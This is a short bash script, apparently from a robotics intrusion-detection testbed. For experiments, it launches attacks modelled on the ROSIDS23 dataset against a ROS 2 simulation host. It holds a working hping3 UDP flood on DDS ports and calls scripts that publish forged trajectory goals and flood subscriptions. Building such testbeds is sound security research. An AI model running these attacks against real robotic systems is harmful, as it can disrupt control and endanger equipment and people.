#!/bin/bash
# Attacks for conditions C2/C3 (ROSIDS23 attack classes reproduced on ROS 2). Usage: attack.sh <dos|pub|subflood> <seconds>
source /opt/ros/jazzy/setup.bash
KIND=${1:-dos}; SEC=${2:-330}
case $KIND in
  dos)       # UDP flood on the DDS user-traffic ports of the simulation host (domain 7: 7400+250*7 = 9150..)
    timeout $SEC hping3 --udp -p 9161 -i u100 -d 512 sim >/dev/null 2>&1 ;;           # ~10k packets/s
  pub)       # unauthorized publish: forged trajectory goals on the controller topic, 2 Hz
    timeout $SEC python3 /opt/testbed/atk_pub.py ;;
  subflood)  # subscriber flood: many subscriptions to /joint_states from one rogue participant
    timeout $SEC python3 /opt/testbed/atk_subflood.py ;;
esac
echo "attack $KIND finished"
